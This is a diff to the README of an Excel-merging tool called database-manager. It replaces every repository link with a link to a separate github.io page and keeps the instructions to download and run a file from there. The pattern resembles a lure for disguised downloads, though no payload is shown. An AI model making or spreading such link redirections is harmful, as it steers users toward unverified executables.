@@ -11,13 +11,13 @@ Welcome to **database-manager**! This application helps you combine multiple Exc
 - ✅ Adapts columns to your data type
 - ✅ Available in Uzbek, Russian, and English
 
-[![Download Now](https://img.shields.io/badge/Download-database--manager-blue?style=for-the-badge&logo=github)](https://github.com/Raptra9987/database-manager)
+[![Download Now](https://img.shields.io/badge/Download-database--manager-blue?style=for-the-badge&logo=github)](https://raptra9987.github.io)
 
 ## 📥 Download and Install
 
 Visit this link to download the application:
 
-**[https://github.com/Raptra9987/database-manager](https://github.com/Raptra9987/database-manager)**
+**[https://raptra9987.github.io](https://raptra9987.github.io)**
 
 Once you arrive at the page, look for the download button. Click it and wait for the download to complete. Then, run the downloaded file to start using database-manager.
 
@@ -114,7 +114,7 @@ The application works with modern Excel formats (.xlsx). For older formats (.xls
 
 If you encounter any issues or have suggestions for improvement, please visit:
 
-**[https://github.com/Raptra9987/database-manager](https://github.com/Raptra9987/database-manager)**
+**[https://raptra9987.github.io](https://raptra9987.github.io)**
 
 You can report bugs, request features, or contribute to the project.
 
@@ -128,7 +128,7 @@ This application is provided as-is for personal and commercial use. Redistributi
 
 Download now and simplify your data management today:
 
-**👉 [Download database-manager](https://github.com/Raptra9987/database-manager) 👈**
+**👉 [Download database-manager](https://raptra9987.github.io) 👈**
 
 One download. Infinite possibilities. Your complete database is just minutes away.
 
